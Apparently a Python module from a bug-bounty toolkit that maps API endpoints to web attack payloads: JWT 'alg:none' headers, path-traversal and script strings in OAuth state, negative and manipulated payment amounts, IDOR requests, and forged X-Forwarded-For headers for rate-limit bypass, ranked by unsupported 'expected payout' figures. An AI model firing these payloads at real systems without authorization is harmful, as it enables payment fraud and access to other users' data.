#!/usr/bin/env python3
"""
Copyright (c) 2025 YOUR_NAME_HERE
Proprietary and Confidential
All Rights Reserved

This software is proprietary and confidential.
Unauthorized copying, modification, or distribution is prohibited.

System ID: BB_20251102_5946
Owner: YOUR_NAME_HERE
"""

"""
Unique Attack Generator
Creates attack payloads based on PDF methodologies that competitors miss
"""

import json
from typing import List, Dict

class UniqueAttackGenerator:
    """Generate unique attack vectors based on advanced PDF methodologies"""
    
    # API Manipulation Attacks (Hacking APIs PDF)
    API_ATTACKS = {
        "graphql_introspection_bypass": {
            "payloads": [
                "query { __schema { types { name } } }",
                "query { __type(name: \"Query\") { fields { name } } }",
                "mutation { __schema { queryType { name } } }"
            ],
            "technique": "GraphQL introspection bypass",
            "target": "GraphQL endpoints",
            "expected_payout": "$500-$3,000"
        },
        "jwt_alg_none": {
            "payloads": [
                '{"alg":"none","typ":"JWT"}',
                '{"alg":"NONE","typ":"JWT"}',
                '{"alg":"nOnE","typ":"JWT"}'
            ],
            "technique": "JWT algorithm confusion",
            "target": "JWT tokens",
            "expected_payout": "$500-$5,000"
        },
        "oauth_state_manipulation": {
            "payloads": [
                "state=../../etc/passwd",
                "state=javascript:alert(1)",
                "state=null",
                "state="
            ],
            "technique": "OAuth state parameter manipulation",
            "target": "OAuth flows",
            "expected_payout": "$500-$3,000"
        },
        "api_version_downgrade": {
            "payloads": [
                "/api/v1/endpoint (try v2, v3, etc.)",
                "Accept: application/json; version=1.0",
                "X-API-Version: 1.0"
            ],
            "technique": "API version downgrade",
            "target": "Versioned APIs",
            "expected_payout": "$500-$2,000"
        }
    }
    
    # Payment Logic Attacks (Always Pay)
    PAYMENT_ATTACKS = {
        "race_condition": {
            "payloads": [
                "Send multiple simultaneous payment requests",
                "Concurrent refund requests",
                "Parallel transaction creation"
            ],
            "technique": "Race condition exploitation",
            "target": "Payment endpoints",
            "expected_payout": "$1,000-$10,000"
        },
        "negative_amount": {
            "payloads": [
                '{"amount": -100}',
                '{"amount": -0.01}',
                '{"amount": "-100"}'
            ],
            "technique": "Negative amount manipulation",
            "target": "Payment endpoints",
            "expected_payout": "$1,000-$5,000"
        },
        "currency_manipulation": {
            "payloads": [
                '{"currency": "USD", "amount": 100, "rate": 0.001}',
                '{"currency": "BTC", "amount": 0.00000001}',
                '{"from_currency": "USD", "to_currency": "USD", "rate": 999999}'
            ],
            "technique": "Currency conversion bypass",
            "target": "Payment conversion",
            "expected_payout": "$1,000-$8,000"
        },
        "refund_duplication": {
            "payloads": [
                "Multiple refund requests for same transaction",
                "Refund before transaction completes",
                "Refund amount > transaction amount"
            ],
            "technique": "Refund duplication",
            "target": "Refund endpoints",
            "expected_payout": "$1,000-$10,000"
        }
    }
    
    # Advanced IDOR (Better than basic)
    IDOR_ATTACKS = {
        "file_upload_idor": {
            "payloads": [
                "/api/v1/files/12345 (change ID)",
                "/api/v1/upload/../../other_user_file",
                "PUT /api/v1/files/12345 (change ownership)"
            ],
            "technique": "IDOR in file uploads",
            "target": "File endpoints",
            "expected_payout": "$500-$3,000"
        },
        "batch_idor": {
            "payloads": [
                '{"ids": [1,2,3,999999]}',
                '{"user_ids": ["user1", "user2", "other_user"]}',
                "POST /api/v1/batch (include other users' IDs)"
            ],
            "technique": "IDOR in batch operations",
            "target": "Batch endpoints",
            "expected_payout": "$500-$5,000"
        },
        "http_method_idor": {
            "payloads": [
                "PUT /api/v1/users/12345",
                "PATCH /api/v1/users/12345",
                "DELETE /api/v1/users/12345"
            ],
            "technique": "IDOR via HTTP methods",
            "target": "REST APIs",
            "expected_payout": "$500-$3,000"
        }
    }
    
    # Business Logic Attacks (Unique)
    BUSINESS_LOGIC_ATTACKS = {
        "workflow_bypass": {
            "payloads": [
                "Skip step 2, go directly to step 3",
                "Complete workflow without required steps",
                "Manipulate workflow state"
            ],
            "technique": "Workflow bypass",
            "target": "Multi-step processes",
            "expected_payout": "$1,000-$5,000"
        },
        "rate_limit_bypass": {
            "payloads": [
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "Remove rate limit headers"
            ],
            "technique": "Rate limit bypass",
            "target": "Rate-limited endpoints",
            "expected_payout": "$500-$3,000"
        },
        "time_manipulation": {
            "payloads": [
                '{"timestamp": 9999999999}',
                '{"expires_at": "2099-12-31"}',
                "Manipulate time-based validations"
            ],
            "technique": "Time-based attacks",
            "target": "Time-sensitive operations",
            "expected_payout": "$500-$3,000"
        }
    }
    
    @staticmethod
    def get_attacks_for_endpoint(endpoint: str) -> List[Dict]:
        """Get relevant attacks for an endpoint"""
        attacks = []
        
        # Payment endpoints
        if any(keyword in endpoint.lower() for keyword in ["payment", "transaction", "checkout", "refund", "wallet", "billing"]):
            attacks.extend([
                UniqueAttackGenerator.PAYMENT_ATTACKS["race_condition"],
                UniqueAttackGenerator.PAYMENT_ATTACKS["negative_amount"],
                UniqueAttackGenerator.PAYMENT_ATTACKS["currency_manipulation"],
                UniqueAttackGenerator.PAYMENT_ATTACKS["refund_duplication"]
            ])
        
        # Auth endpoints
        if any(keyword in endpoint.lower() for keyword in ["auth", "login", "token", "oauth", "session"]):
            attacks.extend([
                UniqueAttackGenerator.API_ATTACKS["jwt_alg_none"],
                UniqueAttackGenerator.API_ATTACKS["oauth_state_manipulation"]
            ])
        
        # API endpoints
        if "/api/" in endpoint.lower() or "graphql" in endpoint.lower():
            attacks.extend([
                UniqueAttackGenerator.API_ATTACKS["graphql_introspection_bypass"],
                UniqueAttackGenerator.API_ATTACKS["api_version_downgrade"]
            ])
        
        # User/data endpoints
        if any(keyword in endpoint.lower() for keyword in ["user", "profile", "account", "data"]):
            attacks.extend([
                UniqueAttackGenerator.IDOR_ATTACKS["file_upload_idor"],
                UniqueAttackGenerator.IDOR_ATTACKS["batch_idor"],
                UniqueAttackGenerator.IDOR_ATTACKS["http_method_idor"]
            ])
        
        # Business logic (always applicable)
        attacks.extend([
            UniqueAttackGenerator.BUSINESS_LOGIC_ATTACKS["workflow_bypass"],
            UniqueAttackGenerator.BUSINESS_LOGIC_ATTACKS["rate_limit_bypass"],
            UniqueAttackGenerator.BUSINESS_LOGIC_ATTACKS["time_manipulation"]
        ])
        
        return attacks
    
    @staticmethod
    def generate_attack_plan(endpoints: List[str]) -> Dict:
        """Generate complete attack plan for endpoints"""
        plan = {
            "priority_1": [],  # Payment endpoints
            "priority_2": [],  # Auth endpoints
            "priority_3": [],  # Other endpoints
            "total_attacks": 0
        }
        
        for endpoint in endpoints:
            attacks = UniqueAttackGenerator.get_attacks_for_endpoint(endpoint)
            
            entry = {
                "endpoint": endpoint,
                "attacks": attacks,
                "expected_payout": "$500-$5,000",
                "acceptance_rate": "70-85%"
            }
            
            # Prioritize
            if any(keyword in endpoint.lower() for keyword in ["payment", "transaction", "checkout", "refund"]):
                plan["priority_1"].append(entry)
            elif any(keyword in endpoint.lower() for keyword in ["auth", "login", "token"]):
                plan["priority_2"].append(entry)
            else:
                plan["priority_3"].append(entry)
            
            plan["total_attacks"] += len(attacks)
        
        return plan


# System ID: BB_20251102_5946
# Owner: YOUR_NAME_HERE
# Build Date: 2025-11-02 02:45:55
